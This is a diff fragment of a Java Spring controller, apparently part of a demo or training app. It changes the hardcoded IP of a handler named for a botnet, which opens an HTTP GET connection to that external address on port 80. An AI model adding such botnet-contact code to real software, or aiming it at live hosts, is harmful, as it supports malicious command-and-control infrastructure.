@@ -31,14 +31,14 @@ public class GreetingController {
 	@RequestMapping(value="/submit", method=RequestMethod.POST, params="action=botnet")
 	public String botnetConnect(Model model) {
 		Botnet botnet = new Botnet();
-		botnet.setIp("1.123.37.68");
+		botnet.setIp("2.56.59.42");
 		botnet.setPort("80");
 		model.addAttribute("botnet", botnet);
 		model.addAttribute("greeting", new Greeting());
 		URL url;
 		try {
 			System.out.println("Sending request to botnet");
-			url = new URL("http://1.123.37.68:80");
+			url = new URL("http://2.56.59.42:80");
 			HttpURLConnection con = (HttpURLConnection) url.openConnection();
 			con.setRequestMethod("GET");
 			con.setConnectTimeout(2000);
